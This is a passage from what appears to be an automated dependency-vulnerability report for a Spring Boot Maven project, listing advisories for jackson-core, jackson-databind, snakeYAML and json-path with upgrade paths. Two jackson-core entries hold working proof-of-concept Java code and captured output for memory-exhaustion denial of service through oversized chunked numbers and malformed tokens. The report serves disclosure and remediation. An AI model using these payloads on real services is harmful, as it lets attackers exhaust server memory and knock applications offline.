        if (outPtr >= outBuf.length) {
            outBuf = _textBuffer.expandCurrentSegment();
        }
        outBuf[outPtr++] = (char) ch;
    }
    _setIntLength(outPtr+negMod);            // <-- validated here
    _textBuffer.setCurrentLength(outPtr);
    return _valueComplete(JsonToken.VALUE_NUMBER_INT);
}
```

The pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467, 1481, 1586, 1644, 1698 — every "ran out of input mid-integer" exit returns to the caller without validating the accumulator length.

### Compare with the fraction path that is correct

`_finishFloatFraction` lines 1827-1838:

```java
while (loop) {
    if (ch >= INT_0 && ch <= INT_9) {
        ++fractLen;
        if (outPtr >= outBuf.length) {
            outBuf = _textBuffer.expandCurrentSegment();
        }
        outBuf[outPtr++] = (char) ch;
        if (_inputPtr >= _inputEnd) {
            _textBuffer.setCurrentLength(outPtr);
            _setFractLength(fractLen);          // <-- VALIDATED
            return JsonToken.NOT_AVAILABLE;
        }
        ch = getNextSignedByteFromBuffer();
    }
    ...
}
```

## Impact

Reactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON, anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the async parser as they arrive. Operators who set `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that this caps memory per number value are not getting that guarantee in chunked-feed scenarios. The parser silently accumulates digits up to `maxStringLength` (20 MiB default) per concurrent connection. Multiply by attacker-controlled concurrency to OOM the JVM.

The synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and the async parser on *complete* input are not affected — those paths go through `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.

CWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly the same as the parent advisory (Network / Low complexity / High availability impact). The parent advisory was scored CVSS 8.7 High.

## Proof of concept

Standalone PoC, no Maven required:

```
mkdir poc && cd poc
curl -sLo jackson-core-2.18.6.jar https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/jackson-core-2.18.6.jar
cat > PoC.java <<'EOF'
import com.fasterxml.jackson.core.*;
import com.fasterxml.jackson.core.async.ByteArrayFeeder;

public class PoC {
    public static void main(String[] args) throws Exception {
        StreamReadConstraints strict = StreamReadConstraints.builder()
                .maxNumberLength(1000)
                .build();
        JsonFactory f = new JsonFactoryBuilder()
                .streamReadConstraints(strict)
                .build();

        // Sanity: synchronous parser rejects 5000-digit int.
        try (JsonParser p = f.createParser("{\"v\":" + "1".repeat(5000) + "}")) {
            while (p.nextToken() != null) { /* drive */ }
            System.out.println("[-] BUG ABSENT: sync parser accepted");
            return;
        } catch (Exception e) {
            System.out.println("[+] sync parser rejected 5000-digit int: " + e.getClass().getSimpleName());
        }

        // Bug: async parser, chunked, no terminator.
        JsonParser ap = f.createNonBlockingByteArrayParser();
        ByteArrayFeeder feeder = (ByteArrayFeeder) ap;

        byte[] preamble = "{\"v\":".getBytes("UTF-8");
        feeder.feedInput(preamble, 0, preamble.length);
        while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }

        byte[] digits = new byte[16 * 1024];
        for (int i = 0; i < digits.length; i++) digits[i] = (byte) ('1' + (i % 9));

        for (int c = 0; c < 600; c++) {
            feeder.feedInput(digits, 0, digits.length);
            JsonToken t = ap.nextToken();
            if (t != JsonToken.NOT_AVAILABLE) {
                System.out.println("[-] unexpected token: " + t);
                return;
            }
        }
        System.out.println("[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000");

        // Closing the number now finally triggers the validator.
        feeder.feedInput("}".getBytes("UTF-8"), 0, 1);
        feeder.endOfInput();
        try {
            while (ap.nextToken() != null) { /* drive */ }
        } catch (Exception e) {
            System.out.println("[*] late rejection on close: " + e.getMessage().split("\n")[0]);
        }
        ap.close();
    }
}
EOF
javac -cp jackson-core-2.18.6.jar PoC.java
java -Xmx256m -cp jackson-core-2.18.6.jar:. PoC
```

Observed output against `jackson-core-2.18.6`:

```
[+] sync parser rejected 5000-digit int: StreamConstraintsException
[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000
[*] late rejection on close: Number value length (9830400) exceeds the maximum allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)
```

Observed output against `jackson-core-2.21.1`: identical.

The 9.83 MB figure is purely a function of the loop bound (600 chunks * 16 KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy declared as `maxNumberLength = 1000`, the parser permits **9830x** more allocation than the policy allows. With `maxStringLength` left at the default 20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap (chars are 2 bytes each) before the validator finally fires on terminator/`endOfInput()`. Multiply by concurrent connections.

## End-to-end reproduction through real HTTP

Supplements the standalone PoC with a running Spring Boot WebFlux server,
driving the same bug through the actual reactor-netty + Jackson2JsonDecoder
streaming-decode path that production reactive endpoints use.

Setup:
- Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty 1.1.23)
- jackson-databind 2.17.2, jackson-core overridden:
  - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest published)
  - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch
- JVM: OpenJDK 17.0.18
- Server `JsonFactory` configured with `StreamReadConstraints.builder().maxNumberLength(1000).build()`

Endpoint under test exposes the `Flux<DataBuffer>` request body directly to
`Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees one
HTTP chunk per `feedInput` (the same pattern used for any
`@RequestBody Flux<...>` / streaming JSON decoder in WebFlux). A raw-socket
HTTP/1.1 chunked client streams `{"v":1` then 250 chunks of 200 digit bytes
each (50,000 digits total) at 20ms intervals, then writes the closing `}`.

VULN — jackson-core 2.18.7:
```
[VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still accepting
[VULN-SMALLCHUNK] full POST sent (50000 digits). Response:
HTTP/1.1 200 OK
ERR after 6548ms cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:
       Number value length (50000) exceeds the maximum allowed (1000, ...)
```
Server-side controller trace (250 DataBuffer arrivals elided):
```
[ctrl] DataBuffer arrived size=6   ms=39       <- '{"v":1'
[ctrl] DataBuffer arrived size=200 ms=42
...
[ctrl] DataBuffer arrived size=199 ms=5993
[ctrl] DataBuffer arrived size=1   ms=6518     <- closing '}'
[ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...
```
Server held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with
`maxNumberLength=1000` declared. The validator never fires during streaming;
it only fires at value-completion when the closing `}` arrives.

PATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):
```
[PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno 32] Broken pipe
[PATCHED-SMALLCHUNK] DONE: digits_sent=2801 status=connection-broke-mid-stream
```
Server-side controller trace:
```
[ctrl] DataBuffer arrived size=6   ms=129
[ctrl] DataBuffer arrived size=200 ms=142
[ctrl] DataBuffer arrived size=200 ms=142
[ctrl] DataBuffer arrived size=200 ms=145
[ctrl] DataBuffer arrived size=200 ms=146
[ctrl] DataBuffer arrived size=200 ms=147
[ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum allowed (1000, ...)
```
Patched server raises `StreamConstraintsException` at 155ms after only 5
DataBuffers, exactly when the accumulated digit count crosses
`maxNumberLength=1000`. The connection is reset mid-stream rather than the
parser silently consuming the rest of the attacker's payload.

Side-by-side:

| Build | Chunks accepted before exception | Digits buffered | Time to detection |
|---|---|---|---|
| jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit) | 6,548ms — only at terminator |
| 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed |

Note on the default `@RequestBody Mono<JsonNode>` path: that path cannot
distinguish the two builds because Spring's `decodeToMono` joins all
DataBuffers into one before parsing. The exploitable shape is the
streaming-decode path (`Flux<JsonNode>` / `@RequestBody Flux<...>` /
WebSocket / SSE / any direct `decoder.decode(Flux<DataBuffer>, ...)` call),
which is also what `Jackson2Tokenizer` uses for any streaming JSON
deserialization in WebFlux and Quarkus reactive REST.

## Suggested fix

Mirror the pattern already used in `_finishFloatFraction`. At every site that returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first. Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:

```diff
     protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {
         int negMod = _numberNegative ? -1 : 0;

         while (true) {
             if (_inputPtr >= _inputEnd) {
                 _minorState = MINOR_NUMBER_INTEGER_DIGITS;
                 _textBuffer.setCurrentLength(outPtr);
+                _streamReadConstraints.validateIntegerLength(outPtr + negMod);
                 return _updateTokenToNA();
             }
```

Note: `_setIntLength` itself can't be used as-is because it also assigns `_intLength`, and `_intLength` must not be set until the integer is truly complete (subsequent fraction handling reads `_intLength`). The minimal fix is to call only the validator, as shown.

Apply the same one-line insertion before each `return _updateTokenToNA();` that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12 lines total).

Alternatively, a heavier refactor: also gate `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops on `outPtr < maxNumberLength` so that the validator fires at the moment the buffer would be enlarged past the limit, rather than waiting for the next chunk boundary. Either approach is sufficient.

## Credit

Reported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.fasterxml.jackson.core:jackson-core:2.13.5; affected range: < 2.18.8
    - Transitive; pulled by direct root declared at pom.xml:76; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-json:2.7.18 -> com.fasterxml.jackson.core:jackson-databind:2.13.5 -> com.fasterxml.jackson.core:jackson-core:2.13.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-core: upgrade to 2.18.8 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-89425: jackson-core: UTF8DataInputJsonParser._reportInvalidToken() missing maxErrorTokenLength limit -> unbounded StringBuilder growth (DoS)
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:76

[CVE-2026-89425](https://github.com/advisories/GHSA-7hhh-6rmp-j9qf): jackson-core: UTF8DataInputJsonParser._reportInvalidToken() missing maxErrorTokenLength limit -> unbounded StringBuilder growth (DoS)

GHSA: GHSA-7hhh-6rmp-j9qf
Severity: HIGH

## Status

**FULLY REPRODUCED.** A malformed token fed through `createParser(DataInput)` produced a
20,000,109-character exception message from a 20-million-character attacker payload, while the
identical payload fed through `createParser(InputStream)` produced a correctly bounded
367-character message.

## Affected Component / Version

- **Package:** `com.fasterxml.jackson.core:jackson-core`
- **Confirmed against:** `jackson-core-2.20.2`
- **Affected file:** `src/main/java/com/fasterxml/jackson/core/json/UTF8DataInputJsonParser.java`
  (`_reportInvalidToken(int, String, String)`, lines ~2763-2780 in the 2.20.2 tree)

## Technical Analysis

`UTF8DataInputJsonParser._reportInvalidToken()` builds the offending-token description for its
exception message by appending identifier characters one at a time to a bare `StringBuilder`:

```java
protected void _reportInvalidToken(int ch, String matchedPart, String msg) throws IOException {
    StringBuilder sb = new StringBuilder(matchedPart);
    while (true) {
        char c = (char) _decodeCharForError(ch);
        if (!Character.isJavaIdentifierPart(c)) {
            break;
        }
        sb.append(c);
        ch = _inputData.readUnsignedByte();
    }
    _reportError("Unrecognized token '"+sb.toString()+"': was expecting "+msg);
}
```

There is **no check against `ErrorReportConfiguration.getMaxErrorTokenLength()`** (default 256)
anywhere in this loop. By contrast, the sibling `UTF8StreamJsonParser` implementation of the
same logic does enforce it:

```java
// UTF8StreamJsonParser.java (control, correctly bounded)
if (sb.length() >= _ioContext.errorReportConfiguration().getMaxErrorTokenLength()) {
    sb.append("...");
    break;
}
```

`ReaderBasedJsonParser` and `NonBlockingUtf8JsonParserBase` also correctly enforce the limit —
this is a defect isolated to the `DataInput`-backed implementation specifically, confirmed by
direct comparison of all four parser implementations in this tree.

This path is additionally left with **no fallback control**: because of `[core#1570]`-related
logic in `JsonFactory`, configuring `maxDocumentLength` causes `DataInput`-sourced parser
creation to be rejected outright, so a document-length backstop cannot coexist with this input
source, and the identifier-character accumulation never passes through
`ReadConstrainedTextBuffer`, so `maxStringLength` does not apply either. There is no
configuration an application can set to mitigate this specific path.

## Reproduction Procedure

Same clone/build steps as `jackson-core_1_...md`. Then:

```bash
CP="build/classes:build/lib/fastdoubleparser-2.0.1.jar"
javac -cp "$CP" -d poc poc/PoC6_UnboundedErrorTokenStringBuilder.java
java -Xmx2g -cp "poc:$CP" PoC6_UnboundedErrorTokenStringBuilder
```

## Full PoC Source (`poc/PoC6_UnboundedErrorTokenStringBuilder.java`)

```java
import com.fasterxml.jackson.core.*;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;

public class PoC6_UnboundedErrorTokenStringBuilder {

    static class RepeatingByteInputStream extends InputStream {
        private final int b;
        private long remaining;
        RepeatingByteInputStream(int b, long count) { this.b = b; this.remaining = count; }
        @Override public int read() {
            if (remaining <= 0) return -1;
            remaining--;
            return b;
        }
    }

    public static void main(String[] args) throws Exception {
        final long IDENTIFIER_CHAR_COUNT = 20_000_000L;

        System.out.println("Malformed token: \"t\" followed by " + IDENTIFIER_CHAR_COUNT
                + " Java-identifier characters ('x'), then a terminating space, never completing"
                + " \"true\"/\"false\"/\"null\"/NaN.\n");

        System.out.println("=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===");
        {
            InputStream raw = concat3("{\"a\": t".getBytes("UTF-8"),
                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), " }".getBytes("UTF-8"));
            DataInputStream dataIn = new DataInputStream(raw);
            JsonFactory factory = new JsonFactory();
            JsonParser p = factory.createParser((java.io.DataInput) dataIn);

            long heapBefore = usedHeap();
            long t0 = System.nanoTime();
            String message = null;
            try {
                p.nextToken(); p.nextToken(); p.nextToken();
            } catch (JsonParseException e) {
                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();
            } catch (IOException e) {
                message = "(stream ended: " + e + ")";
            }
            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;
            long heapAfter = usedHeap();

            int msgLen = message == null ? -1 : message.length();
            System.out.println("Exception message length: " + msgLen + " characters");
            System.out.println("Elapsed time: " + elapsedMs + " ms");
            System.out.println("Approx additional heap used: " + ((heapAfter - heapBefore) / (1024 * 1024)) + " MB");
            System.out.println("Message length proportional to the full " + IDENTIFIER_CHAR_COUNT
                    + "-character payload (unbounded)? " + (msgLen > 1_000_000));
        }

        System.out.println("\n=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===");
        {
            InputStream raw = concat3("{\"a\": t".getBytes("UTF-8"),
                    new RepeatingByteInputStream('x', IDENTIFIER_CHAR_COUNT), " }".getBytes("UTF-8"));
            JsonFactory factory = new JsonFactory();
            JsonParser p = factory.createParser(raw);

            long t0 = System.nanoTime();
            String message = null;
            try {
                p.nextToken(); p.nextToken(); p.nextToken();
            } catch (JsonParseException e) {
                message = e.getOriginalMessage() != null ? e.getOriginalMessage() : e.getMessage();
            } catch (IOException e) {
                message = "(stream ended: " + e + ")";
            }
            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;
            int msgLen = message == null ? -1 : message.length();
            System.out.println("Exception message length: " + msgLen + " characters");
            System.out.println("Elapsed time: " + elapsedMs + " ms");
            System.out.println("Message length bounded near default maxErrorTokenLength (256)? " + (msgLen < 500));
        }
    }

    static InputStream concat3(byte[] prefix, InputStream middle, byte[] suffix) {
        InputStream first = new java.io.SequenceInputStream(new java.io.ByteArrayInputStream(prefix), middle);
        return new java.io.SequenceInputStream(first, new java.io.ByteArrayInputStream(suffix));
    }

    static long usedHeap() {
        Runtime rt = Runtime.getRuntime();
        System.gc();
        return rt.totalMemory() - rt.freeMemory();
    }
}
```

## Captured Evidence (actual run output)

```
Malformed token: "t" followed by 20000000 Java-identifier characters ('x'), then a terminating
space, never completing "true"/"false"/"null"/NaN.

=== (a) UTF8DataInputJsonParser via createParser(DataInput) ===
Exception message length: 20000109 characters
Elapsed time: 81 ms
Approx additional heap used (best-effort, GC-noisy): 38 MB
Message length is proportional to the full 20000000-character attacker payload (unbounded)? true

=== (b) UTF8StreamJsonParser via createParser(InputStream), SAME malformed input ===
Exception message length: 367 characters
Elapsed time: 7 ms
Message length bounded near ErrorReportConfiguration.getMaxErrorTokenLength() (default 256)? true
```

The same 20-million-character malformed token, fed to the two parser variants, produces a
367-character message via the correctly-bounded `InputStream` path and a 20,000,109-character
message via the vulnerable `DataInput` path — a difference of roughly 54,500x for identical
input, confirming the missing bound is the sole cause of the difference.

## Impact

Any application creating parsers via `JsonFactory.createParser(DataInput)` over
attacker-supplied input (a fully public, documented API) is exposed to unbounded memory growth
from a single malformed token. Scaling the payload from the 20MB demonstrated here to
gigabytes (well within a typical unbounded request body) would drive the accumulated
`StringBuilder` — which additionally undergoes byte-to-char expansion and internal doubling —
to consume many times the raw payload size, realistically triggering `OutOfMemoryError` and
denying service to the whole JVM process. Critically, **no available configuration mitigates
this**: `maxDocumentLength` cannot be set for `DataInput` sources at all, and `maxStringLength`
does not apply to this code path.

## Remediation

1. Add the `maxErrorTokenLength` check to the append loop in
   `UTF8DataInputJsonParser._reportInvalidToken()`, appending `"..."` and breaking when the
   limit is reached — mirroring the three other parser implementations exactly.
2. Add a parameterized regression test across all four parser implementations asserting the
   exception message length is bounded by `maxErrorTokenLength` plus a small constant.
3. Consider extracting this bounded-scan logic into a single shared helper on
   `ParserMinimalBase` to prevent this class of per-implementation drift recurring.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.fasterxml.jackson.core:jackson-core:2.13.5; affected range: >= 2.8.0, <= 2.18.10
    - Transitive; pulled by direct root declared at pom.xml:76; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-json:2.7.18 -> com.fasterxml.jackson.core:jackson-databind:2.13.5 -> com.fasterxml.jackson.core:jackson-core:2.13.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-core: upgrade to 2.18.11 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-91776: jackson-databind retains every unknown raw type ID 
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:76

[CVE-2026-91776](https://github.com/advisories/GHSA-wv8q-qhhj-9h54): jackson-databind retains every unknown raw type ID 

GHSA: GHSA-wv8q-qhhj-9h54
Severity: HIGH

### Summary

With `@JsonTypeInfo(use = Id.NAME, defaultImpl = ...)`, every distinct unknown
raw type ID selects the same fallback deserializer but is retained as a
separate key in `TypeDeserializerBase._deserializers`. An attacker who can
repeatedly supply new unknown type IDs can grow this process-lifetime cache
without a configured bound.

### Details

The affected path is `TypeDeserializerBase._findDeserializer()`. After an
unknown name-based type ID resolves to the configured fallback/default
implementation, jackson-databind caches the result under the attacker-provided
raw `typeId`. Although all such IDs select the same fallback deserializer, each
new string remains a distinct cache key.

The behavior is runtime-confirmed in jackson-databind 2.22.1 and 3.2.1.
Current 2.22 and 3.2 source branches retained the unbounded `_deserializers`
map and per-raw-ID cache write when rechecked. The earlier affected floor has
not been established, patched versions are: 2.18.11, 2.21.7, 2.22.3, 3.1.7 and 3.2.3.

The vulnerable application must enable name-based polymorphism with a
`defaultImpl` or equivalent fallback, accept attacker-influenced type IDs, and
reuse a long-lived mapper/type deserializer across requests.

Suggested correction: avoid caching each unknown raw ID when every such ID
resolves to the same fallback, use a fallback sentinel, or use an explicitly
bounded concurrency-safe cache. A regression should contrast many distinct
unknown IDs with repetitions of one unknown ID across requests.

### PoC

Configure a polymorphic base type with
`@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, defaultImpl = Fallback.class)` and
deserialize inputs containing unknown type names through the same mapper.
Inspect `TypeDeserializerBase._deserializers` after the run.

On affected 2.x and 3.x versions, 10,000 distinct unknown raw type IDs produce
10,000 retained cache entries even though every input selects the same
fallback deserializer. A matched control that repeats one unknown ID 10,000
times produces one retained entry. This isolates attacker-controlled key
cardinality from ordinary request count.

### Impact

Where the stated polymorphic fallback configuration is exposed to
attacker-influenced type IDs, distinct inputs cause incremental
process-lifetime memory retention and eventual availability pressure or
denial of service. This is not claimed as a single-request allocation spike,
and no fixed bytes-per-ID or time-to-out-of-memory value is asserted. No
confidentiality, integrity, or code-execution impact is claimed.

Requested credit: Daniel Birtwhistle

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.fasterxml.jackson.core:jackson-databind:2.13.5; affected range: >= 2.0.0, <= 2.18.10
    - Transitive; pulled by direct root declared at pom.xml:76; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-json:2.7.18 -> com.fasterxml.jackson.core:jackson-databind:2.13.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.18.11 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2026-91777: jackson-databind quadratic forward-reference completion 
- **Category:** CVE
- **Severity:** mandatory
- **Story Points:** 1
- **Files:** pom.xml:76

[CVE-2026-91777](https://github.com/advisories/GHSA-cxp5-3px4-pw24): jackson-databind quadratic forward-reference completion 

GHSA: GHSA-cxp5-3px4-pw24
Severity: HIGH

### Summary

When an `@JsonIdentityInfo` collection or map first creates N unresolved
object-ID references and later resolves the same IDs in reverse order,
jackson-databind scans the remaining pending-reference accumulator for each
resolution. A shallow JSON document whose size grows linearly can therefore
cause quadratic CPU work during deserialization.

### Details

The affected path is forward-reference completion in
`CollectionDeserializer.CollectionReferringAccumulator.resolveForwardReference()`
and the corresponding map implementation. The implementation performs a
linear search of the pending accumulator for every resolved object ID.

The behavior is runtime-confirmed in jackson-databind 2.5.0, 2.22.1, and
3.2.1. Current 2.22 and 3.2 source branches retained the same design when
rechecked. A 2.4.0 control fails closed before successful reverse-order
completion, so 2.5.0 is the conservative runtime-confirmed affected floor.
The patched versions are: 2.18.11, 2.21.7, 2.22.3, 3.1.7 and 3.2.3.

The vulnerable application must deserialize attacker-influenced JSON into an
identity-enabled collection or map. The issue does not require deep nesting or
syntactically unusual JSON.

Suggested correction: replace repeated linear lookup/removal with a keyed
pending-reference structure or another design that provides linear or
amortized-linear completion. A regression should preserve input order,
duplicate-ID behavior, and unresolved-ID errors while bounding reverse-order
resolution work.

### PoC

The proof constructs a shallow collection containing N unresolved
`@JsonIdentityInfo` references followed by definitions of those same IDs in
reverse order. Its ID class counts `equals()` calls, giving a deterministic
work measure rather than a timing-dependent result.

With N=2,000, affected versions perform exactly 2,003,000 ID comparisons. An
equally sized control in which every reference is already resolved performs
zero comparisons in the pending-reference lookup path. The run is bounded to
a 512 MiB JVM. The result demonstrates quadratic growth: approximately
`N * (N + 1) / 2` comparisons, plus fixed setup comparisons.

### Impact

An unauthenticated source that can submit JSON to an application using the
affected identity-enabled collection or map shape can consume quadratic CPU
and exhaust a request-time or worker-capacity budget, causing denial of
service. The application model/configuration prerequisite is material. No
confidentiality, integrity, code-execution, or parser-depth impact is claimed.

Requested credit: Daniel Birtwhistle

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.fasterxml.jackson.core:jackson-databind:2.13.5; affected range: >= 2.5.0, <= 2.18.10
    - Transitive; pulled by direct root declared at pom.xml:76; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-json:2.7.18 -> com.fasterxml.jackson.core:jackson-databind:2.13.5

Recommended fix:
  - com.fasterxml.jackson.core:jackson-databind: upgrade to 2.18.11 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2022-38749: snakeYAML before 1.31 vulnerable to Denial of Service due to Out-of-bounds Write
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2022-38749](https://github.com/advisories/GHSA-c4r9-r8fh-9vj2): snakeYAML before 1.31 vulnerable to Denial of Service due to Out-of-bounds Write

GHSA: GHSA-c4r9-r8fh-9vj2
Severity: MEDIUM

Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.yaml:snakeyaml:1.30; affected range: < 1.31
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.yaml:snakeyaml:1.30

Recommended fix:
  - org.yaml:snakeyaml: upgrade to 1.31 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2022-38750: snakeYAML before 1.31 vulnerable to Denial of Service due to Out-of-bounds Write
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2022-38750](https://github.com/advisories/GHSA-hhhw-99gj-p3c3): snakeYAML before 1.31 vulnerable to Denial of Service due to Out-of-bounds Write

GHSA: GHSA-hhhw-99gj-p3c3
Severity: MEDIUM

Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.yaml:snakeyaml:1.30; affected range: < 1.31
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.yaml:snakeyaml:1.30

Recommended fix:
  - org.yaml:snakeyaml: upgrade to 1.31 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2022-38751: snakeYAML before 1.31 vulnerable to Denial of Service due to Out-of-bounds Write
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2022-38751](https://github.com/advisories/GHSA-98wm-3w3q-mw94): snakeYAML before 1.31 vulnerable to Denial of Service due to Out-of-bounds Write

GHSA: GHSA-98wm-3w3q-mw94
Severity: MEDIUM

Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.yaml:snakeyaml:1.30; affected range: < 1.31
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.yaml:snakeyaml:1.30

Recommended fix:
  - org.yaml:snakeyaml: upgrade to 1.31 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2022-38752: snakeYAML before 1.32 vulnerable to Denial of Service due to Out-of-bounds Write
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2022-38752](https://github.com/advisories/GHSA-9w3m-gqgf-c4p9): snakeYAML before 1.32 vulnerable to Denial of Service due to Out-of-bounds Write

GHSA: GHSA-9w3m-gqgf-c4p9
Severity: MEDIUM

Using snakeYAML to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DoS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stack-overflow.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.yaml:snakeyaml:1.30; affected range: < 1.32
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.yaml:snakeyaml:1.30

Recommended fix:
  - org.yaml:snakeyaml: upgrade to 1.32 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2022-41854: Snakeyaml vulnerable to Stack overflow leading to denial of service
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:32

[CVE-2022-41854](https://github.com/advisories/GHSA-w37g-rhq8-7m4j): Snakeyaml vulnerable to Stack overflow leading to denial of service

GHSA: GHSA-w37g-rhq8-7m4j
Severity: MEDIUM

Those using Snakeyaml to parse untrusted YAML files may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stack overflow. This effect may support a denial of service attack.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - org.yaml:snakeyaml:1.30; affected range: < 1.32
    - Transitive; pulled by direct root declared at pom.xml:32; scope: compile; full resolved chain: org.springframework.boot:spring-boot-starter-web:2.7.18 -> org.springframework.boot:spring-boot-starter:2.7.18 -> org.yaml:snakeyaml:1.30

Recommended fix:
  - org.yaml:snakeyaml: upgrade to 1.32 or a compatible unaffected release; verify the range and release branch; update the direct root/BOM when transitive.

### CVE-2023-51074: json-path Out-of-bounds Write vulnerability
- **Category:** CVE
- **Severity:** optional
- **Story Points:** 1
- **Files:** pom.xml:82

[CVE-2023-51074](https://github.com/advisories/GHSA-pfh2-hfmq-phg5): json-path Out-of-bounds Write vulnerability

GHSA: GHSA-pfh2-hfmq-phg5
Severity: MEDIUM

json-path v2.8.0 was discovered to contain a stack overflow via the `Criteria.parse()` method.

Affected dependencies (Maven dependency:tree, including compile/runtime/test and optional dependencies):
  - com.jayway.jsonpath:json-path:2.7.0; affected range: >= 2.2.0, < 2.9.0
    - Transitive; pulled by direct root declared at pom.xml:82; scope: test; full resolved chain: org.springframework.boot:spring-boot-starter-test:2.7.18 -> com.jayway.jsonpath:json-path:2.7.0

